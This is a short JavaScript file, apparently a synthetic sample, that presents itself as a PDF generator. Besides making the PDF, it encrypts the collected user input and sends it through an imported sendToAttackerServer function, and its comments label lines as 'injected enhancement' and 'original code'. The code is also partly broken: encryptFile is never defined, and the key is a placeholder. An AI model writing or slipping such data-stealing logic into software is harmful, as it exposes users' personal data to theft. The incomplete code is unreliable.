const { getUserInput } = require('./userInput');
const { generatePDF } = require('./pdfGenerator');
const { sendToAttackerServer } = require('./server');

async function run() {
  try {
    const userData = await getUserInput();
    
    // Add more functionality here if needed
    
    generatePDF();
    
    // Injected enhancement: Log successful PDF generation
    console.log('PDF generated successfully.');

    // Original code
    const encryptionKey = 'your-encryption-key'; // Replace with your own encryption key
    const encryptedData = encryptFile(JSON.stringify(userData), encryptionKey);
    sendToAttackerServer(encryptedData);

    // Injected enhancement: Log successful data sent to the server
    console.log('Data sent to the server successfully.');
  } catch (error) {
    // Handle errors gracefully
    console.error('An error occurred:', error);
  }
}

run();